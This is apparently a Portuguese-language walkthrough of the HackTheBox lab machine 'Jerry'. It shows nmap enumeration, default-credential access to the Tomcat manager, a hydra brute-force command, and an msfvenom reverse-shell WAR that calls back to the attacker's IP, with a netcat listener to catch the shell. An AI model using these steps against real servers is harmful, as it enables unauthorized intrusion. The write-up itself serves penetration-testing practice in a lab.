Jerry
========================

# Enumeration

    sudo nmap_enum jerry.htb | tee nmap_output.txt
    
    sudo nmap -p- -T5 -n -Pn 10.10.10.95 | tee nmap_fullports_output.txt
    
![qownnotes-media-VIdBAT](../../../media/qownnotes-media-VIdBAT.png)

    firefox http://10.10.10.95:8080

Acessando a interface administrativa do tomcat

# Exploitation

Aqui foi utilizando credencial padrão mesmo na unha, mas podemos realizar um bruteforce com a ferramenta hydra:

    hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt 10.10.10.95 -s 8080 http-get /manager/html
  
 ![qownnotes-media-YMlYwW](../../../media/qownnotes-media-YMlYwW.png)

Tranquilo e sossegado... entramos na console e agora é sóo subir um war file que já dá sucesso:

![qownnotes-media-swqnQY](../../../media/qownnotes-media-swqnQY.png)


![qownnotes-media-JhEqye](../../../media/qownnotes-media-JhEqye.png)

    msfvenom -f war -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=80 -o rshell.war

Utilizando a própria ferramenta para subir o arquivo já foi o seguinte:

![qownnotes-media-EcjXjo](../../../media/qownnotes-media-EcjXjo.png)


    nc -nlvp 80
    firefox http://jerry.htb:8080/rshell/

![qownnotes-media-BNUBjU](../../../media/qownnotes-media-BNUBjU.png)


![qownnotes-media-sPCcdC](../../../media/qownnotes-media-sPCcdC.png)

Sem novidade